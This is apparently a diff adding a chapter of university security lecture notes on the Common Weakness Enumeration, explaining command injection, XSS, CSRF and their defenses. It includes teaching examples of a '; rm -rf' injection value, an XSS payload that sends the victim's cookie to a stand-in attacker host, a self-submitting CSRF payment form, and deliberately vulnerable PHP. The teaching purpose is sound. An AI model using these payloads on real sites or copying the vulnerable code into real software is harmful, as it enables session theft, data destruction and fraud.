@@ -1,0 +1,452 @@
+% =========================================================
+\chapter{Lecture 9 : Adversarial thinking II}
+% =========================================================
+
+\begin{rembox}[title=In a nutshell]
+\textbf{What is this lecture about?} Lecture 8 asked ``what can go wrong?''. This one asks
+\textbf{``what not to do?''}: the \textbf{Common Weakness Enumeration (CWE)}, MITRE's database of
+the software errors that most often lead to vulnerabilities, grouped in three classes:
+\textbf{insecure interaction between components}, \textbf{risky resource management} and
+\textbf{porous defenses}. Most examples are on the web, so the lecture starts with a short
+\textbf{web cheat sheet} (HTTP, cookies, GET and POST, HTML, PHP). We then dissect three classic
+injection-style attacks: \textbf{OS command injection}, \textbf{cross-site scripting (XSS)} and
+\textbf{cross-site request forgery (CSRF)}, with the \textbf{Same Origin Policy} and the defenses
+against CSRF. \\
+\textbf{Why is it useful?} XSS, SQL injection, CSRF and command injection sit in the top 10 of the
+most dangerous software errors year after year. They all come from one mistake, using input you do
+not control without sanitizing it, and one mental model, the confused deputy, explains CSRF.
+\end{rembox}
+
+\section{Web preliminaries}
+
+\begin{rembox}[title=Why this cheat sheet]
+Not a guide to web programming: only the basic concepts needed to understand the security problems
+of the lecture. Up to now the course had two scenarios: a user acting \textbf{locally} on their
+own device (local authentication, access control and execution), and a user acting
+\textbf{remotely} on a server (the device is merely a screen). On the web, \textbf{browser and
+server collaborate}: remote authentication, remote access control, and \textbf{mixed program
+execution} (code runs on both sides). Two tools: \textbf{HTTP}, the protocol between browsers and
+servers, and \textbf{PHP}, a language embedding dynamic, server-side elements in web pages.
+\end{rembox}
+
+\begin{defnbox}[title={Where we are: the top layers of the Internet (OSI model)}]
+\begin{center}
+\small
+\begin{tabular}{l|l}
+\textbf{Layer} & \textbf{Examples} \\ \hline
+Application  & \textbf{HTTP} \\
+Presentation & \\
+Session      & SSL, TLS \\
+Transport    & TCP, UDP \\
+Network      & IP (naming and routing: DNS, BGP) \\
+Data link    & IEEE 802.3 Ethernet (naming and routing: ARP) \\
+Physical     & modulation and coding
+\end{tabular}
+\end{center}
+This lecture focuses on the \textbf{top layers}.
+\end{defnbox}
+
+\begin{defnbox}[title={HTTP/1.1: HyperText Transfer Protocol}]
+The protocol that determines what actions web servers and browsers take in response to commands.
+\begin{itemize}
+  \item \textbf{Request-response}: (1) the client (browser) sends a \textbf{request} (for an HTML
+        file, to update a database, to send a mail, \ldots); (2) the server processes it, performs
+        the action, and sends a \textbf{response} (the content to render, or an acknowledgement).
+  \item \textbf{Stateless}: each command is executed independently, without any knowledge of the
+        previous ones. Neither browser nor server keeps state: \textbf{the state must be sent
+        inside the requests and responses}. Very important for security.
+\end{itemize}
+\end{defnbox}
+
+\begin{defnbox}[title=Cookies]
+A \textbf{small piece of data stored by the browser} on the user's device.
+\begin{itemize}
+  \item \textbf{Main goal}: store state information (shopping cart, login) to create HTTP
+        \textbf{sessions} on top of a stateless protocol.
+  \item \textbf{Secondary use}: tracking users.
+  \item \textbf{Ambient authority in cookies}: if you are logged into \texttt{bank.com}, you have
+        cookies for \texttt{bank.com}, and \textbf{every} new HTTP request to \texttt{bank.com}
+        automatically includes all of them, so that you stay logged in (no login for every
+        request). Whoever makes your browser send a request to \texttt{bank.com} uses your
+        session.
+\end{itemize}
+\end{defnbox}
+
+\begin{defnbox}[title={URL, GET and POST}]
+\begin{itemize}
+  \item \textbf{URL} (Uniform Resource Locator): a standard way to reference a resource (text,
+        page, script, image). It contains the \textbf{protocol}, the \textbf{host} (a domain, or an
+        IP and a port) and the \textbf{path} of the resource on that host, e.g.\
+        \texttt{https://www.mywebsite.com/apparel/skirt.php}.
+  \item \textbf{GET}: requests an existing resource. Its parameters are \textbf{encoded in the
+        URL} as key/value pairs, the \textbf{query string}, after \texttt{?} and separated by
+        \texttt{\&}: \texttt{\ldots/skirt.php?sku=123\&lang=en\&sect=silk} passes \texttt{sku=123},
+        \texttt{lang=en}, \texttt{sect=silk}.
+  \item \textbf{POST}: creates or updates a resource on the server. The data travels in the
+        \textbf{request body} (form fields \texttt{name1=value1\&name2=value2}, JSON, XML).
+\end{itemize}
+A GET request \textbf{should not} change any data, a POST typically does; but \textbf{nothing
+enforces it}. A developer could build \texttt{GET /user/delete?id=123}: if a search engine crawls
+that link, it deletes a user. Very bad design, technically possible. (Standard methodologies, e.g.\
+REST, structure HTTP APIs.)
+\end{defnbox}
+
+\begin{defnbox}[title={HTML and PHP}]
+\begin{itemize}
+  \item \textbf{HTML} (HyperText Markup Language): tells the browser \textbf{how to render} a
+        document; parts of it are \textbf{marked with tags} (\texttt{<head>}, \texttt{<title>},
+        \texttt{<body>}, \texttt{<h1>}, \texttt{<p>}, \ldots). The HTTP response usually carries
+        HTML: data + the way to display it.
+  \item \textbf{PHP} (``PHP Hypertext Preprocessor''): a \textbf{server} scripting language
+        (still behind WordPress, Drupal) that builds web pages \textbf{on the fly} from inputs
+        and variables. Variables start with \texttt{\$}. Special variables read what the client
+        sent: \texttt{\$\_GET[param]} (from the URL), \texttt{\$\_POST[param]} (from the body),
+        \texttt{\$\_SESSION[param]} (from the session tied to the cookie). \texttt{echo} outputs
+        HTML.
+\end{itemize}
+\begin{lstlisting}[language=PHP]
+<?php
+$var = "class";
+echo "<h2>PHP is Fun!</h2>";
+echo "Hello $var!<br>";       // sent to the browser as: Hello class!<br>
+echo "Learning PHP<br>";
+?>
+\end{lstlisting}
+\end{defnbox}
+
+\begin{defnbox}[title={Lifetime of a request on a PHP server}]
+\textbf{GET}: the browser sends \texttt{GET /index.php} with headers (User-Agent, Accept, \ldots);
+the web server (Apache, Nginx) sees the \texttt{.php} extension (not a static file) and passes the
+request to the \textbf{PHP interpreter}; PHP runs the script command by command (reads the request,
+the database, checks sessions, \ldots) and \textbf{builds an HTML document as a string}; the
+complete HTML goes back to the web server and to the browser. \\
+\textbf{POST}: same path, with the form data in the body (\texttt{username=test\&pass=1234}); PHP
+fills \texttt{\$\_POST} and runs, e.g., \texttt{login.php}, typically writing to the database (the
+main goal of a POST). It then answers with a page (\texttt{200 OK}, ``Success!'') or with a
+\textbf{redirect} (\texttt{header('Location: /dashboard.php')}): the
+\textbf{Post/Redirect/Get} pattern, which avoids submitting the form twice when the user hits
+``refresh''.
+\end{defnbox}
+
+\section{Common Weakness Enumeration (CWE)}
+
+\begin{defnbox}[title={Common Weakness Enumeration}]
+\textbf{Idea}: a \textbf{database of software errors leading to vulnerabilities}, to help security
+engineers avoid common pitfalls: \textbf{``what not to do''}. STRIDE (Lecture 8) reasons about what
+the adversary can do; the CWE reduces the attack surface by \textbf{not repeating known errors}.
+MITRE explains each error with its consequences; at a high level, each one makes the software
+break a security principle. The 2011 classification has three classes:
+\begin{itemize}
+  \item \textbf{Insecure interaction between components}: one subsystem feeds another subsystem
+        data that is not sanitized.
+  \item \textbf{Risky resource management}: the system acts on inputs that are not sanitized.
+  \item \textbf{Porous defenses}: defenses fail to provide full protection or complete mediation,
+        through missing checks or partial mechanisms.
+\end{itemize}
+\end{defnbox}
+
+\begin{exbox}[title={CWE Top 25 (current list, first 8)}]
+\begin{center}
+\small
+\begin{tabular}{r|l|l}
+\textbf{\#} & \textbf{Weakness} & \textbf{CWE} \\ \hline
+1 & Cross-site Scripting (XSS) & CWE-79 \\
+2 & Out-of-bounds Write & CWE-787 \\
+3 & SQL Injection & CWE-89 \\
+4 & Cross-Site Request Forgery (CSRF) & CWE-352 \\
+5 & Path Traversal & CWE-22 \\
+6 & Out-of-bounds Read & CWE-125 \\
+7 & OS Command Injection & CWE-78 \\
+8 & Use After Free & CWE-416
+\end{tabular}
+\end{center}
+XSS, SQL injection, CSRF and OS command injection (all \emph{injections} of attacker-controlled
+input) are highlighted in the slides: four of the top 7.
+\end{exbox}
+
+\section{CWE I: Insecure interaction between components}
+
+\begin{defnbox}[title={Insecure interaction between components}]
+``Insecure ways in which data is sent and received between separate components, modules, programs,
+processes, threads, or systems.'' One subsystem feeds another subsystem data that is \textbf{not
+sanitized}; the program uses it, with unintended behaviors that the adversary exploits.
+\end{defnbox}
+
+\subsection{CWE-78: OS command injection}
+
+\begin{defnbox}[title={CWE-78: Improper Neutralization of Special Elements used in an OS Command}]
+A program shows the user the content of their folder under \texttt{/home}. A web form with one field
+sends \texttt{userName} by POST; the server pastes it at the end of the Linux command
+\texttt{ls -l /home/} (for \texttt{ctroncoso}: \texttt{ls -l /home/ctroncoso}).
+\begin{lstlisting}[language=HTML]
+<form action="/url/myscript.php" method="post">
+  userName: <input name="userName" type="text" />
+  <input name="submit" type="submit" value="Submit">
+</form>
+\end{lstlisting}
+\begin{lstlisting}[language=PHP]
+$userName = $_POST["userName"];       // no check on $userName format!
+$command  = 'ls -l /home/' . $userName;
+system($command);
+\end{lstlisting}
+\end{defnbox}
+
+\begin{warnbox}[title={What happens if \texttt{\$userName = `; rm -rf'}?}]
+For Linux, \texttt{;} ends a command and starts a new one. The OS runs \texttt{ls -l /home/}
+(lists the home directories), then \textbf{whatever comes after the semicolon}: \texttt{rm -rf}
+deletes \textbf{recursively} (\texttt{-r}) \textbf{without asking} (\texttt{-f}) everything under
+\texttt{/home}. The attacker controls a piece of a command run with the \textbf{server's}
+privileges.
+\end{warnbox}
+
+\subsection{CWE-79: Cross-site scripting (XSS)}
+
+\begin{defnbox}[title={CWE-79: Improper Neutralization of Input During Web Page Generation}]
+Same spirit, but the input is used to \textbf{generate web content} instead of a command. The form
+now sends \texttt{userName} by \textbf{GET} (in the URL, after \texttt{?}), and the server greets
+the user (``Welcome Rick''):
+\begin{lstlisting}[language=PHP]
+$username = $_GET['userName'];        // no check on $userName format!
+echo '<div class="header"> Welcome, ' . $username . '</div>';
+\end{lstlisting}
+What if I browse \texttt{http://trustedSite.com/welcome.php?userName=} followed by
+\begin{center}
+\texttt{<script>alert("You've been attacked!");</script>}\,?
+\end{center}
+The tags are pasted into the page. When the browser renders it and finds
+\texttt{<script>\ldots</script>}, it runs the content with its JavaScript engine: a popup reads
+``You've been attacked!''.
+\end{defnbox}
+
+\begin{warnbox}[title={From a popup to stealing cookies}]
+A more harmful input:
+\begin{center}
+\texttt{<script>location="http://attacker/submit?cookie=" + document.cookie;</script>}
+\end{center}
+The script makes the browser request the attacker's URL, with the user's \textbf{cookie for
+\texttt{trustedSite.com}} as parameter. Cookies may contain sensitive information (login,
+personalization) or security-relevant information: the session token that \textbf{resumes a session
+without login and password}. (A popup could also ask for the password and send it.)
+\end{warnbox}
+
+\begin{defnbox}[title={How XSS attacks a victim}]
+\begin{enumerate}
+  \item The adversary exploits an XSS vulnerability to put a \textbf{malicious script} on a
+        website (here, one that sends the browser's cookie to \texttt{http://attacker}).
+  \item The victim requests the page with the injected code.
+  \item The page is served, \textbf{downloading the malicious script} to the victim's machine.
+  \item The victim's browser executes it, sending the victim's cookie \textbf{for that website} to
+        the attacker, who can now log in as the victim without credentials.
+\end{enumerate}
+The script runs \textbf{as if it came from the trusted site}: the browser trusts the site, the site
+trusted the input.
+\end{defnbox}
+
+\begin{propbox}[title={How to avoid injection?}]
+\textbf{Sanitization, sanitization, sanitization, and a little bit of sanitization.} Never
+send/execute anything that comes from an untrusted source without sanitizing it. \textbf{Remember
+BIBA} (Lecture 4): never bring information from \textbf{low} (unknown, the user) into \textbf{high}
+(the OS, the server, the page of a trusted site) without sanitization. \\
+\textbf{Why are these attacks so pervasive then?} \textbf{Cross-subsystem sanitization is hard!}
+Subsystem A (the PHP script) must know the set of valid inputs of subsystem B (the shell, the HTML
+parser, the SQL engine), and often lacks that information.
+\end{propbox}
+
+\begin{rembox}[title={In practice (not in the slides)}]
+Sanitize \emph{for the destination}: escape HTML special characters before writing input into a
+page (\texttt{<} becomes \texttt{\&lt;}, e.g.\ PHP's \texttt{htmlspecialchars}), pass arguments to
+programs without going through a shell, use prepared statements for SQL, and prefer a whitelist
+(``a username is letters and digits'') to a blacklist (``no semicolon''): fail-safe defaults.
+\end{rembox}
+
+\subsection{CWE-352: Cross-site request forgery (CSRF)}
+
+\begin{defnbox}[title={The target: an HR payment form (hypothetical EPFL example)}]
+The HR website shows a form with three fields, sent by POST to \texttt{payStudent.php}:
+\begin{lstlisting}[language=HTML]
+<h3>EPFL HR Payment Form</h3>
+<form action="/url/payStudent.php" method="post">
+  Firstname: <input type="text" name="firstname"/><br/>
+  Lastname:  <input type="text" name="lastname"/><br/>
+  Amount:    <input type="text" name="amount">
+  <input type="submit" name="submit" value="Pay">
+</form>
+\end{lstlisting}
+\begin{lstlisting}[language=PHP]
+<?php
+session_start();                       // to validate the session cookie
+if (! session_is_registered("username")) {
+  echo "invalid session detected!";     // redirect user to login page
+  exit;
+}
+// the session is valid: process the request
+$originAccount      = findAccount($_SESSION['username']);
+$destinationAccount = findAccount($_POST['firstname'], $_POST['lastname']);
+send_money($originAccount, $destinationAccount, $_POST['amount']);
+echo "Your transfer has been successful.";
+?>
+\end{lstlisting}
+The script (1) checks that the request carries a \textbf{session cookie} of an authenticated user
+(else ``invalid session detected!''); (2) takes as \textbf{origin account} the user in the
+cookie and as \textbf{destination} the name in the form; (3) sends the amount.
+\end{defnbox}
+
+\begin{warnbox}[title={The attack}]
+A Malicious Student builds a page full of Minions and Rick \& Morty images, containing a copy of
+the form with \textbf{hidden} fields and \textbf{hard-coded values}, submitted by JavaScript
+\textbf{as soon as the page loads}:
+\begin{lstlisting}[language=HTML]
+<script>
+function SendAttack () { form.submit(); }   // send to /url/payStudent.php
+</script>
+<body onload="javascript:SendAttack();">
+<form action="http://epflHR.ch/paystudent.php" id="form" method="post">
+  <input type="hidden" name="firstname" value="Malicious">
+  <input type="hidden" name="lastname"  value="Student">
+  <input type="hidden" name="amount"    value="1000 CHF">
+  <img src="https://i.redd.it/388eovi0ebqz.jpg">
+</form>
+\end{lstlisting}
+Only the image shows. A victim \textbf{logged in on the HR site} visits the page:
+\begin{itemize}
+  \item her browser sends the POST to \texttt{epflHR.ch} \textbf{with her HR session cookie}
+        (ambient authority), so the session check passes;
+  \item \texttt{\$\_SESSION} holds \textbf{her} username $\Rightarrow$ origin account = victim's;
+  \item \texttt{\$\_POST} holds the hidden values $\Rightarrow$ destination = Malicious Student;
+  \item 1000 CHF move from the victim to the Malicious Student.
+\end{itemize}
+\end{warnbox}
+
+\begin{keybox}[title={CSRF is an instance of the confused deputy problem}]
+``Using another program to execute a function with higher privileges\ldots{} have we seen this
+before?'' Yes (Lecture 3). The victim's (HR-accredited) web client is \textbf{confused} into
+performing an action that \textbf{seems authorized by the victim}, but in fact grants the victim's
+privileges to the Malicious Student. It is enabled by \textbf{ambient authority}: with cookie-based
+authentication, if the victim is logged in, the web client acts with her privileges, for
+\emph{any} page that makes it send a request. A login cookie has the same effect as being logged
+in on Linux: whatever runs ``under'' the cookie runs with the user's privileges.
+\end{keybox}
+
+\begin{defnbox}[title={Same Origin Policy (SOP)}]
+A web browser security mechanism, on by default: it \textbf{restricts scripts of one origin from
+accessing data of another origin}. An \textbf{origin} is the triple \textbf{(protocol, host,
+port)}, e.g.\ \texttt{https://example.com:8000}.
+\begin{center}
+\small
+\begin{tabular}{l|l|l}
+\multicolumn{2}{l|}{\textbf{URLs}} & \textbf{Same origin?} \\ \hline
+\texttt{https://example.com/a} & \texttt{https://example.com/b} & Yes \\
+\texttt{https://example.com/a} & \texttt{http://example.com/a} & No, protocol mismatch \\
+\texttt{https://example.com/a} & \texttt{https://www.example.com/a} & No, host mismatch \\
+\texttt{https://example.com/a} & \texttt{https://example.com:5000/a} & No, port mismatch
+\end{tabular}
+\end{center}
+SOP (1) prevents scripts of origin A from \textbf{reading} data of origin B, and (2) prevents
+origin A from sending B anything but \textbf{``simple'' requests} (GET and POST, with only a few
+modifiable headers). Exceptions, granted by the other origin, are controlled by \textbf{CORS}
+policies (a special HTTP header).
+\end{defnbox}
+
+\begin{warnbox}[title={Why SOP does not stop CSRF}]
+\begin{enumerate}
+  \item The victim logs into the HR site; 2.~her session cookies for the HR site are stored in the
+        browser;
+  \setcounter{enumi}{2}
+  \item she visits the malicious site, which sends a \textbf{POST} to the HR site with the
+        malicious student's data \textbf{and} the victim's stored HR cookies;
+  \item the cookies make the HR site consider the request valid, and process it.
+\end{enumerate}
+A CSRF \textbf{does not read} anything from the other origin: it only \textbf{sends} a simple POST,
+which SOP allows. \textbf{We need to check the origin of the request before executing it.}
+\end{warnbox}
+
+\begin{propbox}[title={How to avoid CSRF}]
+\begin{itemize}
+  \item \textbf{Confirm the origin of authority and request}: check the HTTP \textbf{Referer} (the
+        last page visited) or \textbf{Origin} (host and port that caused the request) header
+        before executing. Widely deployed, not always reliable: browsers might strip these fields.
+  \item \textbf{Make the maximum number of requests side-effect free} (limit the attack surface):
+        if a request cannot change the server, a CSRF on it has no impact. E.g.\ make sure GET
+        requests do not.
+  \item \textbf{Include an authenticator the adversary cannot guess}: an \textbf{anti-CSRF token},
+        a fresh challenge put in the genuine form; the forged form cannot contain it (as
+        challenges stop replay attacks, Lecture 7).
+  \item \textbf{Request re-authentication for every action}: definitely stops the attack, but
+        causes usability problems.
+  \item \textbf{``Modern'' (Chrome, $>$2020): the SameSite cookie attribute}, the most effective
+        solution because it is implemented by the browser by default. An attribute on the session
+        cookie tells the browser when to send it on cross-site requests: \texttt{Strict},
+        \texttt{Lax}, \texttt{None}. It solves many CSRF cases, but not all (e.g.\ not if a GET
+        request changes state).
+\end{itemize}
+\textbf{Why is all this so hard?} HTTP is stateless, so web developers must \textbf{re-define a
+session for each application}, and for a long time there was no standard way of managing sessions:
+errors are common.
+\end{propbox}
+
+\section{CWE II: Risky resource management}
+
+\begin{defnbox}[title={Risky resource management}]
+``Ways in which software does not properly manage the creation, usage, transfer, or destruction of
+important system resources'': the system acts on inputs that are not sanitized.
+\begin{itemize}
+  \item \textbf{The ``buffer overflow'' family}: CWE-120 buffer copy without checking the size of
+        the input (classic buffer overflow), CWE-676 use of a potentially dangerous function,
+        CWE-131 incorrect calculation of buffer size, CWE-190 integer overflow or wraparound. The
+        programmer mis-estimates the memory reserved and overwrites memory, code or important
+        variables, letting the adversary execute arbitrary code.
+  \item \textbf{Other insufficient sanitization}: CWE-22 path traversal (improper limitation of a
+        pathname to a restricted directory), CWE-134 uncontrolled format string: newly created
+        resources fed with unsanitized input.
+  \item \textbf{The ``TCB under the control of the adversary'' bugs}: CWE-494, CWE-829: direct
+        execution of code (full programs or pieces) from untrusted sources.
+\end{itemize}
+(The first two return in the next lecture.)
+\end{defnbox}
+
+\begin{warnbox}[title={The TCB under the control of the adversary}]
+\textbf{Once in the TCB, any property can be violated!}
+\begin{itemize}
+  \item \textbf{CWE-494 Download of code without integrity check}: never include in your TCB code
+        components you have not positively verified; at least \textbf{verify the origin through a
+        signature} (Lecture 6). Example: CVE-2008-3438, Apple Mac OS X did not properly verify
+        the authenticity of updates: a misconfigured update process puts tampered software into
+        critical parts of the system.
+  \item \textbf{CWE-829 Inclusion of functionality from an untrusted control sphere}: a dynamic
+        include under the control of the adversary, e.g.\ \textbf{JavaScript from an untrusted
+        source} on a web page (advertisers, embedded gadgets). Hence \textbf{frames}, which isolate
+        (not perfectly) parts of the page from each other.
+\end{itemize}
+\end{warnbox}
+
+\section{CWE III: Porous defenses}
+
+\begin{defnbox}[title={Porous defenses}]
+``Defensive techniques that are often misused, abused, or just plain ignored'': defenses fail to
+provide full protection or \textbf{complete mediation}, because checks are missing or mechanisms
+only cover part of the security functionality. These are the badly implemented mechanisms of the
+first weeks of the course (authentication, authorization, encryption):
+\begin{center}
+\small
+\begin{tabularx}{\linewidth}{l|X}
+CWE-306 & Missing authentication for critical function \\
+CWE-862 & Missing authorization \\
+CWE-798 & Use of hard-coded credentials \\
+CWE-311 & Missing encryption of sensitive data \\
+CWE-807 & Reliance on untrusted inputs in a security decision \\
+CWE-250 & Execution with unnecessary privileges \\
+CWE-863 & Incorrect authorization \\
+CWE-732 & Incorrect permission assignment for critical resource \\
+CWE-327 & Use of a broken or risky cryptographic algorithm \\
+CWE-307 & Improper restriction of excessive authentication attempts \\
+CWE-759 & Use of a one-way hash without a salt
+\end{tabularx}
+\end{center}
+\end{defnbox}
+
+\begin{rembox}[title=Each porous defense is a lecture]
+CWE-306, 798, 307, 759: authentication (Lecture 7: CWE-759 is option 2 of password storage, CWE-307
+allows online guessing). CWE-862, 863, 732: access control (Lectures 3 and 4). CWE-250: least
+privilege (Lecture 2). CWE-311, 327: cryptography (Lectures 5 and 6). CWE-807: sanitization and
+BIBA (Lecture 4).
+\end{rembox}
